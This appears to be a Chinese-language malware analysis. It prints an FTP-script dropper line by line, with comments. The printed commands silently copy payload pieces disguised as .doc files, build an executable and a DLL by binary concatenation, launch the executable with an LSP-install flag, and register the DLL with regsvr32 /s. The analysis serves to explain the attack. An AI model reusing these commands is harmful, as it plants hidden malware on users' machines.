# copy /Y                       目的路径有同名文件时，不提示直接覆盖
# "_\_\_\_\_\_\_\_\doc\*.*"     恶意攻击者刻意构造的多级目录，每级目录的名字都为_
# >nul                          正常copy一个文件，cmd会有输出，移动了哪些文件，此命令屏蔽这些输出
!call copy /Y "_\_\_\_\_\_\_\_\doc\*.*" "_\" >nul

# 以最大化窗口用文件资源管理器打开目录_
!call start /max explorer _

# 创建目录C:\Users\Public\Update
!call mkdir C:\Users\Public\Update >nul

# 拷贝多级目录下的header.doc到C:\Users\Public\Update下，并重命名为header
!call copy /Y _\_\_\_\_\_\_\_\_rels\header.doc C:\Users\Public\Update\header >nul

# 拷贝多级目录下的sc.doc到C:\Users\Public\Update下，并重命名为sc
!call copy /Y _\_\_\_\_\_\_\_\_rels\sc.doc C:\Users\Public\Update\sc >nul

# %time%是cmd内置的一个环境变量，echo后输出的是17:52:38.46这种形式，其中%TIME:~4,1%表示取索引4（第5个字符）开始的1个字符，也就是2，如果是%TIME:~3,2%就是取52
# 因为没有完整的样本，猜测病毒作者前面已经将%TIME%复制给一个变量，否则调用%TIME:~4,1%取的值是不固定的
!call copy /Y _\_\_\_\_\_\_\_\_rels\%TIME:~4,1%.doc C:\Users\Public\Update\shell32 >nul

# %random%是cmd内置的一个环境变量，随机生成一个0-32767之间的整数，包含0和32767
# 随机生成一个0-32767之间的整数，追加到shell32中
!call echo %RANDOM%>>C:\Users\Public\Update\shell32 >nul

# copy /b     表示拷贝一个二进制文件
# copy在合并多个文件时使用连接符+，本条命令中，连接header和shell32后，重命名为（例如）360.3
!call copy /Y /b C:\Users\Public\Update\header+C:\Users\Public\Update\shell32 C:\Users\Public\Update\360.%TIME:~4,1% >nul

# 合并header和WindowsSecurity.doc，并重命名为（例如）4.exe
!call copy /Y /b C:\Users\Public\Update\header+_\_\_\_\_\_\_\_\_rels\WindowsSecurity.doc C:\Users\Public\Update\%TIME:~3,1%.exe >nul

# 因为没有完整的样本，猜测病毒作者前面已经将%TIME%复制给一个变量，否则每次调用%TIME:~3,1%取的值是变动的
# 调用4.exe -InstallLsp 360.3
!call start C:\Users\Public\Update\%TIME:~3,1%.exe -InstallLsp C:\Users\Public\Update\360.%TIME:~4,1% >nul

# 如果不存在WinVer.dll的话，将header.doc和WinVer.doc合并后重命名为WinVer.dll
# regsvr32通常用来注册dll，注册后系统可以使用dll中的函数，这里用regsvr32静默注册WinVer.dll，静默的意思是成功或失败都没有提示
!IF NOT EXIST C:\Users\Public\WinVer.dll (copy /Y /b _\_\_\_\_\_\_\_\_rels\header.doc+_\_\_\_\_\_\_\_\_rels\WinVer.doc C:\Users\Public\WinVer.dll && regsvr32 /s C:\Users\Public\WinVer.dll)

# ftp下的退出命令
quit